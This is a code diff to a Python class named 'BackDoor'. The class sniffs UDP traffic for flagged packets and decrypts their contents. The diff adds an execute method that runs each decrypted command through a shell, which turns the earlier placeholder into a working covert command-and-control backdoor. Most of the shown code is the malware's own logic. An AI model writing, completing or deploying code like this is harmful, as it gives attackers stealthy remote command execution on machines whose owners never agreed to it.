@@ -2,8 +2,8 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from scapy.layers.inet import UDP, IP, IPOption
 from scapy.all import sniff, send
+from subprocess import run
 import sys
-
 
 
 
@@ -21,25 +21,30 @@ class BackDoor:
         self.sniff_init()
 
 
-    def sniff_init(self):
+    def sniff_init(self) -> None:
         try:
             sniff(filter="udp", prn=lambda p: self.filter_packets(p), store=False)
         except PermissionError:
             print("Permission error! Run as sudo or admin!")
             sys.exit()
 
-    def process_packets(self, data: str):
+    def process_packets(self, data: str) -> None:
         print("Stripping flags to extract data")
         stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
         decrypted_msg = self.decrypt_data(stripped_msg)
-        print("NOW EXECUTE")
+        self.execute(decrypted_msg)
 
 
-    def filter_packets(self, packet):
+    def execute(self, cmd: str) -> None:
+        output = run(cmd, shell=True, capture_output=True, text=True)
+        output = output.stdout
+        print(output)
+
+    def filter_packets(self, packet) -> None:
         try:
-            if UDP in packet and packet[UDP].load.decode().startswith(self.flag_begin) \
-                    and packet[UDP].load.decode().endswith(self.flag_close):
-                msg = packet[UDP].load.decode()
+            msg = packet[UDP].load.decode()
+            if UDP in packet and msg.startswith(self.flag_begin) \
+                    and msg.endswith(self.flag_close):
                 print(f"Received authenticated packet: {msg}")
                 self.process_packets(msg)
         except:
